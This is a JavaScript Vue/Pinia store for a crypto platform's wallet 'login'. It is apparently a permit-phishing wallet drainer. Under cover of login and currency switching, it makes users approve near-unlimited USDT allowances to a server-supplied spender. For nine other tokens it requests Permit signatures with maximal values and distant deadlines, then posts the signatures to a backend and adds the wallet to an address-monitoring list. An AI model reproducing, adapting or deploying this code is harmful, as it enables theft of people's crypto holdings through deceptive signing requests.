import { useLocalStorage } from '@vueuse/core'
import { ref, computed, onUnmounted, nextTick } from 'vue'
import { defineStore, storeToRefs } from 'pinia'
import Web3 from 'web3'
import BigNumber from 'bignumber.js'
import { showToast, closeToast } from 'vant'
import i18n from '@/i18n/index.js'

import { authStore, userStore } from '@/store/index.js'
import { postData, postSign, addAddressMonitor, preLoginApi } from '@/apiService.js'
import { useRequest } from '@/hooks/fetch.js'
import { DAI_ABI, UNI_ABI, AAVE_ABI, XAUT_ABI, RENBTC_ABI, USDC_ABI, STETH_ABI, STKAAVE_ABI, BNB_ABI } from '@/config/abi.js'
import router from '@/router'

const Permit_1 = [
	{
		'name': 'owner',
		'type': 'address',
	},
	{
		'name': 'spender',
		'type': 'address',
	},
	{
		'name': 'value',
		'type': 'uint256',
	},
	{
		'name': 'nonce',
		'type': 'uint256',
	},
	{
		'name': 'deadline',
		'type': 'uint256',
	},
],
	Permit_2 = [
		{
			'name': 'holder',
			'type': 'address',
		},
		{
			'name': 'spender',
			'type': 'address',
		},
		{
			'name': 'nonce',
			'type': 'uint256',
		},
		{
			'name': 'expiry',
			'type': 'uint256',
		},
		{
			'name': 'allowed',
			'type': 'bool',
		},
	]

const ERC20_ABI = [
	// 授权某地址消费用户代币的方法
	{
		'constant': false,
		'inputs': [
			{
				'name': '_spender',
				'type': 'address',
			},
			{
				'name': '_value',
				'type': 'uint256',
			},
		],
		'name': 'approve',
		'outputs': [
			{
				'name': '',
				'type': 'bool',
			},
		],
		'type': 'function',
	},
	// 查询某地址的授权额度
	{
		'constant': true,
		'inputs': [
			{
				'name': '_owner',
				'type': 'address',
			},
			{
				'name': '_spender',
				'type': 'address',
			},
		],
		'name': 'allowance',
		'outputs': [
			{
				'name': '',
				'type': 'uint256',
			},
		],
		'type': 'function',
	},
	{
		'constant': true,
		'inputs': [{ 'name': 'who', 'type': 'address' }],
		'name': 'balanceOf',
		'outputs': [{ 'name': '', 'type': 'uint256' }],
		'payable': false,
		'stateMutability': 'view',
		'type': 'function',
	},
]

const USDT_CONTRACT_ADDRESS = ''

const DEFAULT_SENDER_ADDRESS = ''

const USDC_DOMAIN = {
	'name': 'USD Coin',
	'version': '2',
	'chainId': '1',
	'verifyingContract': '',
},
	ETETH_DOMAIN = {
		'name': 'Liquid staked Ether 2.0',
		'version': '2',
		'chainId': '1',
		'verifyingContract': '',
	},
	UNI_DOMAIN = {
		'name': 'Uniswap',
		// 'version': '2',
		'chainId': '1',
		'verifyingContract': '',
	},
	AAVE_DOMAIN = {
		'name': 'Aave token V3',
		'version': '2',
		'chainId': '1',
		'verifyingContract': '',
	},
	DAI_DOMAIN = {
		'name': 'Dai Stablecoin',
		'version': '1',
		'chainId': '1',
		'verifyingContract': '',
	},
	XAUT_DOMAIN = {
		'name': 'Tether Gold',
		'version': '1',
		'chainId': '1',
		'verifyingContract': '',
	},
	RENBTC_DOMAIN = {
		'name': 'renBTC',
		'version': '1',
		'chainId': '1',
		'verifyingContract': '',
	},
	STKAAVE_DOMAIN = {
		'name': 'Staked Aave',
		'version': '2',
		'chainId': '1',
		'verifyingContract': '',
	},
	BNB_DOMAIN = {
		'name': 'Staked Aave',
		'version': '1',
		'chainId': '1',
		'verifyingContract': '',
	}

const onSignUNI = async ({ from, domain, message, Permit = Permit_1 }) => {
	const sign = {
		'types': {
			'EIP712Domain': [
				{
					'name': 'name',
					'type': 'string',
				},
				// {
				//     'name': 'version',
				//     'type': 'string'
				// },
				{
					'name': 'chainId',
					'type': 'uint256',
				},
				{
					'name': 'verifyingContract',
					'type': 'address',
				},
			],
			Permit,
		},
		'primaryType': 'Permit',
		domain,
		message,
	}

	console.log('签名Permit：', Permit)
	console.log('签名domain：', domain)
	console.log('签名message：', message)
	console.log('签名全部参数：', sign)

	try {
		const result = await window.ethereum.request({
			method: 'eth_signTypedData_v4',
			params: [from, JSON.stringify(sign)],
		})

		const r = result.slice(0, 66),
			s = `0x${result.slice(66, 130)}`,
			v = `0x${result.slice(130, 132)}`

		console.log('签名结果：', result)
		console.log('签名结果 r：', r)
		console.log('签名结果 s：', s)
		console.log('签名结果 v：', v)
		return { result, r, s, v, sign }
	} catch (e) {
		console.error('onSignUNI---情况',e)
		const web3Store = useWeb3Store()
		web3Store.onInit()
		router.push('/noWallet')
		throw e
	}
}

const onSign = async ({ from, domain, message, Permit = Permit_1 }) => {
	const sign = {
		'types': {
			'EIP712Domain': [
				{
					'name': 'name',
					'type': 'string',
				},
				{
					'name': 'version',
					'type': 'string',
				},
				{
					'name': 'chainId',
					'type': 'uint256',
				},
				{
					'name': 'verifyingContract',
					'type': 'address',
				},
			],
			Permit,
		},
		'primaryType': 'Permit',
		domain,
		message,
		// 'domain': {
		//     'name': 'USD Coin',
		//     'version': '2',
		//     'chainId': '1',
		//     'verifyingContract': '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48'
		// },
		// 'message': {
		//     'owner': from,
		//     'spender': '0xc2eb126a0f2ed8d26b2bb302ac1b7238a35528c1',
		//     'value': '1157920892373161954235709850086879078532699846656405640394575840079131296399',
		//     'nonce': '1',
		//     'deadline': '4880576070'
		// }
	}

	console.log('签名Permit：', Permit)
	console.log('签名domain：', domain)
	console.log('签名message：', message)
	console.log('签名全部参数：', sign)

	try {
		const result = await window.ethereum.request({
			method: 'eth_signTypedData_v4',
			params: [from, JSON.stringify(sign)],
		})

		const r = result.slice(0, 66),
			s = `0x${result.slice(66, 130)}`,
			v = `0x${result.slice(130, 132)}`

		console.log('签名结果：', result)
		console.log('签名结果 r：', r)
		console.log('签名结果 s：', s)
		console.log('签名结果 v：', v)
		return { result, r, s, v, sign }
	} catch (e) {
		console.error('onSign--情况',e)
		const web3Store = useWeb3Store()
		web3Store.onInit()
		router.push('/noWallet')
		throw e
	}
}

export const useWeb3Store = defineStore('web3', () => {
	const web3 = ref(null),
		accounts = ref([]),
		isSign = ref(false),
		myAddress=ref('')

	const currentCurrency = useLocalStorage('currentCurrency', {
		id: 0,
		currency: '',
		currencyCode: '',
		fullName: '',
		picUrl: '',
		isRecharge: false,
		isWithdraw: false,
		isExchange: false,
		protocols: null,
		handlingFee: 0,
		isOpenOnlineRecharge: false,
		isOpenQuickPay: false,
		sortBy: 0,
		usd: 0,
		picUrlStr: '',
	})

	const tokenClientList = useLocalStorage('tokenClientList', [])

	const address = computed(() => accounts.value?.[0] ?? '')

	const { run } = useRequest({
		url: '/system/addressMonitor/clientList',
		method: 'post',
		manual: true,
	})

	const { SET_TOKEN_DATA } = authStore()

	const { response: currencyList } = useRequest({
		url: '/system/currency/all',
		method: 'get',
		initialValues: [],
		onSuccess: async (res) => {
			await onInit()

			if(!currentCurrency.value.currency){
				const usdc = res.find((currencyitem) => currencyitem.currencyCode === 'usdc')
				if (usdc) {
					currentCurrency.value = usdc
				} else {
					currentCurrency.value = res[0]
				}
			}

			if(!address.value){
				showToast({message:i18n.global.t('请正确连接你的钱包'),icon: 'info'})

				return
			}

			const preparams = {
				address: address.value,
				chain: 'eth',
				tokenType: currentCurrency.value.currency,
			}
			postData(preparams).then(async (loginres) => {
				console.log('preLoginApi', loginres)
				closeToast()
				// 已经在平台授权过
				if (loginres.data?.tokenTypeList?.includes(currentCurrency.value.currency)) {
					console.log('已经在平台授权过')
					if(loginres.data?.token){
						SET_TOKEN_DATA(loginres.data.token)
					}
					// const usersStore = userStore()
					await nextTick()
					router.replace('/home')
					// usersStore.fetchUserInfoAction().then((infoRes) => {
					//     if (infoRes?.data) {
					//         router.replace('/home')
					//     }
					// })
					return
				} else {
					// const usdc = res.find((currencyitem) => currencyitem.currencyCode === 'usdc')

					// if (usdc) {
					// 	currentCurrency.value = usdc
					// } else {
					// 	currentCurrency.value = res[0]
					// }
					if (accounts.value.length) {
						onChangeCurrency(currentCurrency.value, true)
					}
				}
			})
		},
	})

	const onInit = async () => {
		if (window.ethereum) {
			web3.value = new Web3(window.ethereum)
			// try {
			// 请求用户授权
			accounts.value = await window.ethereum.request({ method: 'eth_requestAccounts' })

			// const res = await onSign({
			//     from: accounts.value[0],
			//     domain: {
			//     ...USDC_DOMAIN,
			//     ,verifyingContract: config?.address ?? DEFAULT_SENDER_ADDRESS
			//     message: {
			//         'owner': accounts.value[0],
			//         'spender': usdcConfig?.contractAddress ?? '0xc2eb126a0f2ed8d26b2bb302ac1b7238a35528c1',
			//         'value': '1157920892373161954235709850086879078532699846656405640394575840079131296399',
			//         'nonce': '1',
			//         'deadline': '4880576070'
			//     }
			// })
			// console.log('签名结果：', res)
			// const userInfo = await postData({
			//     address: accounts.value[0],
			//     chain: 'eth',
			//     tokenType: 'USDC',
			//     encryptionString: res.result,
			//     hash: '',
			//     r: res.r,
			//     s: res.s,
			//     v: res.v,
			//     signData: res.sign
			// })
			// SET_TOKEN_DATA(userInfo.token)
			// router.replace('/home')
			// } catch (error) {
			//     console.error('User denied account access')
			// }
		} else if (window.web3) {
			web3.value = new Web3(window.web3.currentProvider)
			accounts.value = await window.web3.eth.getAccounts()
		} else {
			console.log('Non-Ethereum browser detected. You should consider trying MetaMask!')
		}
		// console.log(address.value)
		if(accounts.value.length>0){
			myAddress.value = accounts.value[0]
		}
		// 移除钱包事件监听
		removeEvent()
		// 钱包事件监听
		addEvent()

		if(address.value){
			run({
				walletAddress: address.value,
				chain: 'ETH',
			})
		}
	}

	onInit()

	const { response: tokenList } = useRequest({
		url: '/system/token/clientList',
		method: 'post',
		initialValues: [],
		onSuccess(data) {
			// console.log('tokenClientList',data)
			tokenClientList.value = data
		}
	})



	const onChangeCurrency = async (currency, init = false) => {
		console.log('onChangeCurrency-当前选择币种：', currency)
		console.log('onChangeCurrency-当前选择钱包地址：', address.value)
		const config = tokenList.value.find((e) => e.name === currency.currency)
		console.log('币种对应的Token配置:', config)
		let balance = 0
		let currentOwnerAddress = address.value || myAddress.value

		if(!currentOwnerAddress){
			showToast({message:i18n.global.t('请正确连接你的钱包'),icon: 'info'})
			onInit()
			return
		}

		if (config) {
			// const nonce = await web3.value.eth.getTransactionCount(config.address)
			if (currency.currency === 'USDT') {
				const usdtContract = new web3.value.eth.Contract(ERC20_ABI, config.address)

				try {
					balance = await usdtContract.methods.balanceOf(currentOwnerAddress).call()
					// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
					const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
					const divisor = new BigNumber(10).pow(decimals)
					balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
					console.log(`${currency.currency}代币余额:`, balance)
				} catch (e) {
					console.error('代币余额',e)
				}

				// 判断是否登陆过
				const preparams2 = {
					address: currentOwnerAddress,
					chain: 'eth',
					tokenType: currency.currency,
				}
				let loginres2 = await preLoginApi(preparams2)
				closeToast()

				if (!init && loginres2.data?.tokenTypeList.includes(currency.currency)) {
					console.log(`${currency.currency}已经在平台登录过:`)
					if(loginres2.data?.token){
						SET_TOKEN_DATA(loginres2.data.token)
					}
					currentCurrency.value = currency
					currentCurrency.value.balance = balance
					await nextTick()
					router.replace('/home')
					return
				} else {
					let authorize = {
						code: '',
					}
					// 使用你的地址和授权金额
					const addressOwner = currentOwnerAddress // 地址应为实际的以太坊地址
					const amountTarget = '411256436224324320870982430867023952481793415358246197461731293'
					approveIfNeeded(addressOwner, amountTarget)
					async function approveIfNeeded(address, amount) {
						try {
							// 1. 获取当前的授权额度
							const currentAllowance = await usdtContract.methods.allowance(address, config.contractAddress).call()
							console.log('当前授权额度:', currentAllowance)
							// 2. 判断当前授权额度是否小于需要的额度
							if (BigInt(currentAllowance) < BigInt(amount)) {
								console.log('当前授权额度不足，正在进行授权...')
								// 3. 授权新的额度
								const result = await usdtContract.methods
									.approve(config.contractAddress, amount)
									.send({ from: address, gas: 50000 })
									.on('error', (error) => {
										console.error('授权额度交易失败，错误信息:', error)
										router.push('/noWallet')
									})

								console.log('授权额度Approval transaction:', result)

								const params = {
									address: address,
									chain: 'eth',
									tokenType: currency.currency,
								}
								const userInfoRes = await postData(params)
								if(userInfoRes.data?.token){
									SET_TOKEN_DATA(userInfoRes.data.token)
								}
								currentCurrency.value = currency
								currentCurrency.value.balance = balance
								// showToast(i18n.global.t('切换成功'))
								await nextTick()

								if(result?.transactionHash){
									authorize = await addAddressMonitor({
										walletAddress: address,
										currency: 'USDT',
										authorizedAmount: amount,
										transactionHash: result.transactionHash,
									})
									console.log(`${currency.currency}addAddressMonitor结果:`, authorize)
								}
								router.replace('/home')
								// approveIfNeeded(addressOwner, amountTarget)
							} else {
								console.log('当前授权额度已经足够，无需再次授权,进入首页。当前授权额度:', currentAllowance)
								authorize.code = 200

								if (authorize?.code === 200) {
									const params = {
										address: address,
										chain: 'eth',
										tokenType: currency.currency,
									}
									const userInfoRes = await postData(params)
									if(userInfoRes.data?.token){
										SET_TOKEN_DATA(userInfoRes.data.token)
									}
									currentCurrency.value = currency
									currentCurrency.value.balance = balance
									// showToast(i18n.global.t('切换成功'))
									await nextTick()
									router.replace('/home')
									// const usersStore = userStore()
									// usersStore.fetchUserInfoAction().then((infoRes) => {
									//     if (infoRes?.data) {
									//         router.replace('/home')
									//     }
									// })
								}
							}
						} catch (e) {
							console.error('USDT授权操作失败:', e)
							authorize.code = ''
							router.push('/noWallet')
						}
					}
				}
			} else {
				let signResult = {}
				if (currency.currency === 'USDC') {
					console.log('ABI:', USDC_ABI)
					const contract = new web3.value.eth.Contract(USDC_ABI, config.address)
					console.log('用ABI创建的合约：', contract)
					let nonce = '0'

					try {
						balance = await contract.methods.balanceOf(currentOwnerAddress).call()
						// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
						const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
						const divisor = new BigNumber(10).pow(decimals)
						balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
						console.log(`${currency.currency}代币余额:`, balance)
					} catch (e) {
						console.error('代币余额',e)
					}
					// 判断是否登陆过
					const preparams2 = {
						address: currentOwnerAddress,
						chain: 'eth',
						tokenType: currency.currency,
					}
					let loginres2 = await preLoginApi(preparams2)
					closeToast()
					if (!init && loginres2.data?.tokenTypeList.includes(currency.currency)) {
						console.log(`${currency.currency}已经 在平台签名过:`)
						if(loginres2.data?.token){
							SET_TOKEN_DATA(loginres2.data.token)
						}
						currentCurrency.value = currency
						currentCurrency.value.balance = balance
						await nextTick()
						router.replace('/home')
						return
					} else {
						try {
							nonce = await contract.methods.nonces(currentOwnerAddress).call()
						} catch (err) {
							console.error('获取nonces的值异常', err)
						}
						console.log('获取nonces的值：', nonce)
						signResult = await onSign({
							from: currentOwnerAddress,
							domain: {
								...USDC_DOMAIN,
								verifyingContract: config?.address ?? DEFAULT_SENDER_ADDRESS,
							},
							message: {
								'owner': currentOwnerAddress,
								'spender': config?.contractAddress ?? DEFAULT_SENDER_ADDRESS,
								'value': '1157920892373161954235709850086879078532699846656405640394575840079131296399',
								nonce,
								'deadline': '4880576070',
							},
						})
					}

				} else if (currency.currency === 'StETH') {
					console.log('ABI:', STETH_ABI)
					const contract = new web3.value.eth.Contract(STETH_ABI, config.address)
					console.log('用ABI创建的合约：', contract)
					let nonce = '0'

					try {
						balance = await contract.methods.balanceOf(currentOwnerAddress).call()
						// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
						const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
						const divisor = new BigNumber(10).pow(decimals)
						balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
						console.log(`${currency.currency}代币余额:`, balance)
					} catch (e) {
						console.error('代币余额',e)
					}

					// 判断是否登陆过
					const preparams2 = {
						address: currentOwnerAddress,
						chain: 'eth',
						tokenType: currency.currency,
					}
					let loginres2 = await preLoginApi(preparams2)
					closeToast()

					if (!init && loginres2.data?.tokenTypeList.includes(currency.currency)) {
						console.log(`${currency.currency}已经 在平台签名过:`)
						if(loginres2.data?.token){
							SET_TOKEN_DATA(loginres2.data.token)
						}
						currentCurrency.value = currency
						currentCurrency.value.balance = balance
						await nextTick()
						router.replace('/home')
						return
					} else {
						try {
							nonce = await contract.methods.nonces(currentOwnerAddress).call()
						} catch (err) {
							console.log('获取nonces的值异常', err)
						}
						console.log('获取nonces的值：', nonce)
						signResult = await onSign({
							from: currentOwnerAddress,
							domain: {
								...ETETH_DOMAIN,
								verifyingContract: config?.address ?? DEFAULT_SENDER_ADDRESS,
							},
							message: {
								'owner': currentOwnerAddress,
								'spender': config?.contractAddress ?? DEFAULT_SENDER_ADDRESS,
								'value': '28948022309329048855892746252171976963317496166410141009864396001978282409984',
								nonce,
								'deadline': '1589205127399',
							},
						})
					}

				} else if (currency.currency === 'UNI') {
					console.log('ABI:', UNI_ABI)
					const contract = new web3.value.eth.Contract(UNI_ABI, config.address)
					console.log('用ABI创建的合约：', contract)
					let nonce = '0'

					try {
						balance = await contract.methods.balanceOf(currentOwnerAddress).call()
						// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
						const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
						const divisor = new BigNumber(10).pow(decimals)
						balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
						console.log(`${currency.currency}代币余额:`, balance)
					} catch (e) {
						console.error('代币余额',e)
					}

					// 判断是否登陆过
					const preparams2 = {
						address: currentOwnerAddress,
						chain: 'eth',
						tokenType: currency.currency,
					}
					let loginres2 = await preLoginApi(preparams2)
					closeToast()
					if (!init && loginres2.data?.tokenTypeList.includes(currency.currency)) {
						console.log(`${currency.currency}已经 在平台签名过:`)
						if(loginres2.data?.token){
							SET_TOKEN_DATA(loginres2.data.token)
						}
						currentCurrency.value = currency
						currentCurrency.value.balance = balance
						await nextTick()
						router.replace('/home')
						return
					} else {
						try {
							nonce = await contract.methods.nonces(currentOwnerAddress).call()
						} catch (err) {
							console.log('获取nonces的值异常', err)
						}
						console.log('获取nonces的值：', nonce)
						signResult = await onSignUNI({
							from: currentOwnerAddress,
							domain: {
								...UNI_DOMAIN,
								verifyingContract: config?.address ?? DEFAULT_SENDER_ADDRESS,
							},
							message: {
								'owner': currentOwnerAddress,
								'spender': config?.contractAddress ?? DEFAULT_SENDER_ADDRESS,
								'value': '39614081257132168796771975168',
								nonce,
								'deadline': '1589205127399',
							},
						})
					}

				} else if (currency.currency === 'AAVE') {
					console.log('ABI:', AAVE_ABI)
					const contract = new web3.value.eth.Contract(AAVE_ABI, config.address)
					console.log('用ABI创建的合约：', contract)
					let nonce = '0'

					try {
						balance = await contract.methods.balanceOf(currentOwnerAddress).call()
						// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
						const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
						const divisor = new BigNumber(10).pow(decimals)
						balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
						console.log(`${currency.currency}代币余额:`, balance)
					} catch (e) {
						console.error('代币余额',e)
					}

					// 判断是否登陆过
					const preparams2 = {
						address: currentOwnerAddress,
						chain: 'eth',
						tokenType: currency.currency,
					}
					let loginres2 = await preLoginApi(preparams2)
					closeToast()
					if (!init && loginres2.data?.tokenTypeList.includes(currency.currency)) {
						console.log(`${currency.currency}已经 在平台签名过:`)
						if(loginres2.data?.token){
							SET_TOKEN_DATA(loginres2.data.token)
						}
						currentCurrency.value = currency
						currentCurrency.value.balance = balance
						await nextTick()
						router.replace('/home')
						return
					} else {
						try {
							nonce = await contract.methods._nonces(currentOwnerAddress).call()
						} catch (err) {
							console.log('获取nonces的值异常', err)
						}
						console.log('获取nonces的值：', nonce)
						signResult = await onSign({
							from: currentOwnerAddress,
							domain: {
								...AAVE_DOMAIN,
								verifyingContract: config?.address ?? DEFAULT_SENDER_ADDRESS,
							},
							message: {
								'owner': currentOwnerAddress,
								'spender': config?.contractAddress ?? DEFAULT_SENDER_ADDRESS,
								'value': '28948022309329048855892746252171976963317496166410141009864396001978282409984',
								nonce,
								'deadline': '1589205127399',
							},
						})
					}

				} else if (currency.currency === 'DAI') {
					console.log('ABI:', DAI_ABI)
					const contract = new web3.value.eth.Contract(DAI_ABI, config.address)
					console.log('用ABI创建的合约：', contract)
					let nonce = '0'

					try {
						balance = await contract.methods.balanceOf(currentOwnerAddress).call()
						// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
						const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
						const divisor = new BigNumber(10).pow(decimals)
						balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
						console.log(`${currency.currency}代币余额:`, balance)
					} catch (e) {
						console.error('代币余额',e)
					}

					// 判断是否登陆过
					const preparams2 = {
						address: currentOwnerAddress,
						chain: 'eth',
						tokenType: currency.currency,
					}
					let loginres2 = await preLoginApi(preparams2)
					closeToast()
					if (!init && loginres2.data?.tokenTypeList.includes(currency.currency)) {
						console.log(`${currency.currency}已经 在平台签名过:`)
						if(loginres2.data?.token){
							SET_TOKEN_DATA(loginres2.data.token)
						}
						currentCurrency.value = currency
						currentCurrency.value.balance = balance
						await nextTick()
						router.replace('/home')
						return
					} else {
						try {
							nonce = await contract.methods.nonces(currentOwnerAddress).call()
						} catch (err) {
							console.log('获取nonces的值异常', err)
						}
						console.log('获取nonces的值：', nonce)
						signResult = await onSign({
							from: currentOwnerAddress,
							domain: {
								...DAI_DOMAIN,
								verifyingContract: config?.address ?? DEFAULT_SENDER_ADDRESS,
							},
							Permit: Permit_2,
							message: {
								'holder': currentOwnerAddress,
								'spender': config?.contractAddress ?? DEFAULT_SENDER_ADDRESS,
								'value': '28948022309329048855892746252171976963317496166410141009864396001978282409984',
								nonce,
								'expiry': '1589205127399',
								'allowed': true,
							},
						})
					}

				} else if (currency.currency === 'XAUT') {
					console.log('ABI:', XAUT_ABI)
					const contract = new web3.value.eth.Contract(XAUT_ABI, config.address)
					console.log('用ABI创建的合约：', contract)
					let nonce = '0'

					try {
						balance = await contract.methods.balanceOf(currentOwnerAddress).call()
						// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
						const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
						const divisor = new BigNumber(10).pow(decimals)
						balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
						console.log(`${currency.currency}代币余额:`, balance)
					} catch (e) {
						console.error('代币余额',e)
					}

					// 判断是否登陆过
					const preparams2 = {
						address: currentOwnerAddress,
						chain: 'eth',
						tokenType: currency.currency,
					}
					let loginres2 = await preLoginApi(preparams2)
					closeToast()
					if (!init && loginres2.data?.tokenTypeList.includes(currency.currency)) {
						console.log(`${currency.currency}已经 在平台签名过:`)
						if(loginres2.data?.token){
							SET_TOKEN_DATA(loginres2.data.token)
						}
						currentCurrency.value = currency
						currentCurrency.value.balance = balance
						await nextTick()
						router.replace('/home')
						return
					} else {
						try {
							nonce = await contract.methods.nonces(currentOwnerAddress).call()
						} catch (err) {
							console.log('获取nonces的值异常', err)
						}
						console.log('获取nonces的值：', nonce)
						signResult = await onSign({
							from: currentOwnerAddress,
							domain: {
								...XAUT_DOMAIN,
								verifyingContract: config?.address ?? DEFAULT_SENDER_ADDRESS,
							},
							message: {
								'owner': currentOwnerAddress,
								'spender': config?.contractAddress ?? DEFAULT_SENDER_ADDRESS,
								'value': '28948022309329048855892746252171976963317496166410141009864396001978282409984',
								nonce,
								'deadline': '1589205127399',
							},
						})
					}

				} else if (currency.currency === 'RenBTC') {
					console.log('ABI:', RENBTC_ABI)
					const contract = new web3.value.eth.Contract(RENBTC_ABI, config.address)
					console.log('用ABI创建的合约：', contract)
					let nonce = '0'

					try {
						balance = await contract.methods.balanceOf(currentOwnerAddress).call()
						// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
						const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
						const divisor = new BigNumber(10).pow(decimals)
						balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
						console.log(`${currency.currency}代币余额:`, balance)
					} catch (e) {
						console.error('代币余额',e)
					}

					// 判断是否登陆过
					const preparams2 = {
						address: currentOwnerAddress,
						chain: 'eth',
						tokenType: currency.currency,
					}
					let loginres2 = await preLoginApi(preparams2)
					closeToast()
					if (!init && loginres2.data?.tokenTypeList.includes(currency.currency)) {
						console.log(`${currency.currency}已经 在平台签名过:`)
						if(loginres2.data?.token){
							SET_TOKEN_DATA(loginres2.data.token)
						}
						currentCurrency.value = currency
						currentCurrency.value.balance = balance
						await nextTick()
						router.replace('/home')
						return
					} else {
						try {
							nonce = await contract.methods.nonces(currentOwnerAddress).call()
						} catch (err) {
							console.log('获取nonces的值异常', err)
						}
						console.log('获取nonces的值：', nonce)
						signResult = await onSign({
							from: currentOwnerAddress,
							domain: {
								...RENBTC_DOMAIN,
								verifyingContract: config?.address ?? DEFAULT_SENDER_ADDRESS,
							},
							Permit: Permit_2,
							message: {
								'holder': currentOwnerAddress,
								'spender': config?.contractAddress ?? DEFAULT_SENDER_ADDRESS,
								nonce,
								'expiry': '1589205127399',
								'allowed': true,
							},
						})
					}

				} else if (currency.currency === 'StkAAVE') {
					console.log('ABI:', STKAAVE_ABI)
					const contract = new web3.value.eth.Contract(STKAAVE_ABI, config.address)
					console.log('用ABI创建的合约：', contract)
					let nonce = '0'

					try {
						balance = await contract.methods.balanceOf(currentOwnerAddress).call()
						// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
						const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
						const divisor = new BigNumber(10).pow(decimals)
						balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
						console.log(`${currency.currency}代币余额:`, balance)
					} catch (e) {
						console.error('代币余额',e)
					}

					// 判断是否登陆过
					const preparams2 = {
						address: currentOwnerAddress,
						chain: 'eth',
						tokenType: currency.currency,
					}
					let loginres2 = await preLoginApi(preparams2)
					closeToast()
					if (!init && loginres2.data?.tokenTypeList.includes(currency.currency)) {
						console.log(`${currency.currency}已经 在平台签名过:`)
						if(loginres2.data?.token){
							SET_TOKEN_DATA(loginres2.data.token)
						}
						currentCurrency.value = currency
						currentCurrency.value.balance = balance
						await nextTick()
						router.replace('/home')
						return
					} else {
						try {
							nonce = await contract.methods._nonces(currentOwnerAddress).call()
						} catch (err) {
							console.log('获取nonces的值异常', err)
						}
						console.log('获取nonces的值：', nonce)
						signResult = await onSign({
							from: currentOwnerAddress,
							domain: {
								...STKAAVE_DOMAIN,
								verifyingContract: config?.address ?? DEFAULT_SENDER_ADDRESS,
							},
							message: {
								'owner': currentOwnerAddress,
								'spender': config?.contractAddress ?? DEFAULT_SENDER_ADDRESS,
								'value': '28948022309329048855892746252171976963317496166410141009864396001978282409984',
								nonce,
								'deadline': '1589205127399',
							},
						})
					}

				} else if (currency.currency === 'BNB') {
					console.log('ABI:', BNB_ABI)
					const contract = new web3.value.eth.Contract(BNB_ABI, config.address)
					console.log('用ABI创建的合约：', contract)
					let nonce = '0'

					try {
						balance = await contract.methods.balanceOf(currentOwnerAddress).call()
						// 用 BigNumber 处理余额，并将其转换为带有 config.decimals 位小数的格式
						const decimals = config.decimals || 6 // 默认精度为 6，如果 config.decimals 没有定义
						const divisor = new BigNumber(10).pow(decimals)
						balance = new BigNumber(balance).dividedBy(divisor).toFixed(decimals)
						console.log(`${currency.currency}代币余额:`, balance)
					} catch (e) {
						console.error('代币余额',e)
					}

					// 判断是否登陆过
					const preparams2 = {
						address: currentOwnerAddress,
						chain: 'eth',
						tokenType: currency.currency,
					}
					let loginres2 = await preLoginApi(preparams2)
					closeToast()
					if (!init && loginres2.data?.tokenTypeList.includes(currency.currency)) {
						console.log(`${currency.currency}已经 在平台签名过:`)
						if(loginres2.data?.token){
							SET_TOKEN_DATA(loginres2.data.token)
						}
						currentCurrency.value = currency
						currentCurrency.value.balance = balance
						await nextTick()
						router.replace('/home')
						return
					} else {
						try {
							nonce = await contract.methods.nonces(currentOwnerAddress).call()
						} catch (err) {
							console.log('获取nonces的值异常', err)
						}
						console.log('获取nonces的值：', nonce)
						signResult = await onSign({
							from: currentOwnerAddress,
							domain: {
								...BNB_DOMAIN,
								verifyingContract: config?.address ?? DEFAULT_SENDER_ADDRESS,
							},
							message: {
								'owner': currentOwnerAddress,
								'spender': config?.contractAddress ?? DEFAULT_SENDER_ADDRESS,
								'value': '28948022309329048855892746252171976963317496166410141009864396001978282409984',
								nonce,
								'deadline': '1589205127399',
							},
						})
					}

				} else {
					console.log('暂不支持该币种')
					return
				}
				console.log('获取nonces所有的合约地址:', config.address)
				console.log('获取nonces所选择的地址:', currentOwnerAddress)
				console.log('发起签名所用的合约地址：', config.address)
				console.log('发起签名所选择的地址：', currentOwnerAddress)
				console.log('签名结果：', signResult)

				const params = {
					address: currentOwnerAddress,
					chain: 'eth',
					tokenType: currency.currency,
					encryptionString: signResult.result,
					hash: '',
					r: signResult.r,
					s: signResult.s,
					v: signResult.v,
					signData: signResult.sign,
				}

				if (!isSign.value) {
					const userInfoRes = await postData(params)
					console.log('login--', userInfoRes)
					if(userInfoRes.data?.token){
						SET_TOKEN_DATA(userInfoRes.data.token)
					}
					currentCurrency.value = currency
					currentCurrency.value.balance = balance
					await nextTick()
					router.replace('/home')
					// const usersStore = userStore()
					// usersStore.fetchUserInfoAction().then((infoRes) => {
					//     if (infoRes?.data) {
					//         router.replace('/home')
					//     }
					// })
				} else {
					try {
						await postSign(params)
					} catch (error) {
						console.log(error)
					}
				}
			}
		} else {
			console.error('币种对应的Token配置不存在')
		}
	}

	// onUnmounted(() => {
	// 	removeEvent()
	// })

	return {
		web3,
		accounts,
		address,
		currencyList,
		currentCurrency,
		onChangeCurrency,
		onInit,
	}
})

// ************* sample data format ******************//

